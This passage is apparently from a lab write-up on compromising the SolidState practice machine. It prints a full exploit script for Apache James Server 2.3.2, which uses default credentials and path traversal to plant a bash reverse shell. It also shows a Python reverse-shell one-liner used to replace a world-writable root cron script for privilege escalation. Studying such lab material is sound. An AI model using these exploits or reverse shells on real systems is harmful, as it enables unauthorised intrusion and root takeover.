<div class="highlight"><pre><span></span><code>sudo nc -nvlp <span class="m">8080</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code>python <span class="m">35513</span>.py <span class="m">192</span>.168.11.141
</code></pre></div>
<div class="highlight"><pre><span></span><code>ssh mindy@192.168.11.141
</code></pre></div>
</div>
<input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><label for="__tabbed_2_2">35513.py</label><div class="tabbed-content">
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1">#</span>
<span class="c1"># Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution</span>
<span class="c1"># Date: 16\10\2014</span>
<span class="c1"># Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec</span>
<span class="c1"># Vendor Homepage: http://james.apache.org/server/</span>
<span class="c1"># Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip</span>
<span class="c1"># Version: Apache James Server 2.3.2</span>
<span class="c1"># Tested on: Ubuntu, Debian</span>
<span class="c1"># Info: This exploit works on default installation of Apache James Server 2.3.2</span>
<span class="c1"># Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d</span>

<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="c1"># specify payload</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/192.168.11.140/8080 0&gt;&amp;1&#39;</span> <span class="c1"># to exploit on any user </span>
<span class="c1"># payload = &#39;[ &quot;$(id -u)&quot; == &quot;0&quot; ] &amp;&amp; touch /root/proof.txt&#39; # to exploit only on root</span>
<span class="c1"># credentials to James Remote Administration Tool (Default - root/root)</span>
<span class="n">user</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span>
<span class="n">pwd</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;[-]Usage: python </span><span class="si">%s</span><span class="s2"> &lt;ip&gt;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;[-]Exemple: python </span><span class="si">%s</span><span class="s2"> 127.0.0.1</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">recv</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
        <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;[+]Connecting to James Remote Administration Tool...&quot;</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="mi">4555</span><span class="p">))</span>
    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">user</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pwd</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="nb">print</span> <span class="s2">&quot;[+]Creating user...&quot;</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;adduser ../../../../../../../../etc/bash_completion.d exploit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;quit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="nb">print</span> <span class="s2">&quot;[+]Connecting to James SMTP server...&quot;</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="mi">25</span><span class="p">))</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;ehlo team@team.pl</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">recv</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="nb">print</span> <span class="s2">&quot;[+]Sending payload...&quot;</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;mail from: &lt;&#39;@team.pl&gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">recv</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="c1"># also try s.send(&quot;rcpt to: &lt;../../../../../../../../etc/bash_completion.d@hostname&gt;\r\n&quot;) if the recipient cannot be found</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;rcpt to: &lt;../../../../../../../../etc/bash_completion.d&gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">recv</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;data</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">recv</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;From: team@team.pl</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;&#39;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">.</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">recv</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;quit</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">recv</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="nb">print</span> <span class="s2">&quot;[+]Done! Payload will be executed once somebody logs in.&quot;</span>
<span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;Connection failed.&quot;</span>
</code></pre></div>
</div>
</div>
<p><img alt="" src="img/3.png" /></p>
<h3 id="using-pspy-to-monitor-process">Using pspy to monitor process</h3>
<p><img alt="" src="img/4.png" /></p>
<p>All user can read, write, modify file <code>tmp.py</code></p>
<div class="highlight"><pre><span></span><code><span class="si">${</span><span class="nv">debian_chroot</span><span class="p">:+(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="si">}</span>mindy@solidstate:~$ ls -l /opt/tmp.py
ls -l /opt/tmp.py
-rwxrwxrwx <span class="m">1</span> root root <span class="m">105</span> Aug <span class="m">22</span>  <span class="m">2017</span> /opt/tmp.py
</code></pre></div>
<p>Create reverse shell python and replace file <code>tmp.py</code></p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;192.168.11.140&quot;</span><span class="p">,</span><span class="mi">4242</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="kn">import</span> <span class="nn">pty</span><span class="p">;</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">)</span>
</code></pre></div>
<p><img alt="" src="img/5.png" /></p>
<blockquote>
<p>I'M ROOT!</p>
</blockquote>
<p><img alt="" src="img/6.png" /></p>
                
              
              
                


              
            </article>
          </div>
        </div>
        
      </main>
      
        
<footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../S2-052/index.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: Pentester Lab: S2-052" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Pentester Lab: S2-052
            </div>
          </div>
        </a>
      
      
        
        <a href="../Wintermute-1-Straylight/index.html" class="md-footer__link md-footer__link--next" aria-label="Next: Wintermute: 1 (Straylight)" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              Wintermute: 1 (Straylight)
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2020 - 2021 LeeCyberSec
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
        
      </div>
      
  <div class="md-footer-social">
    
      
      
        
        
      
      <a href="https://www.facebook.com/leecybersec" target="_blank" rel="noopener" title="www.facebook.com" class="md-footer-social__link">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
      </a>
    
      
      
        
        
      
      <a href="https://twitter.com/leecybersec" target="_blank" rel="noopener" title="twitter.com" class="md-footer-social__link">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
      </a>
    
      
      
        
        
      
      <a href="https://github.com/leecybersec" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
      </a>
    
      
      
        
        
      
      <a href="https://www.linkedin.com/in/leecybersec" target="_blank" rel="noopener" title="www.linkedin.com" class="md-footer-social__link">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
      </a>
    
      
      
        
        
      
      <a href="https://www.youtube.com/channel/UC_2YYw_h37UiMUaPv_tB5Rw" target="_blank" rel="noopener" title="www.youtube.com" class="md-footer-social__link">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"/></svg>
      </a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../../assets/javascripts/workers/search.477d984a.min.js", "version": null}</script>
    
    
      <script src="../../../assets/javascripts/bundle.82b56eb2.min.js"></script>
      
    
  </body>
</html>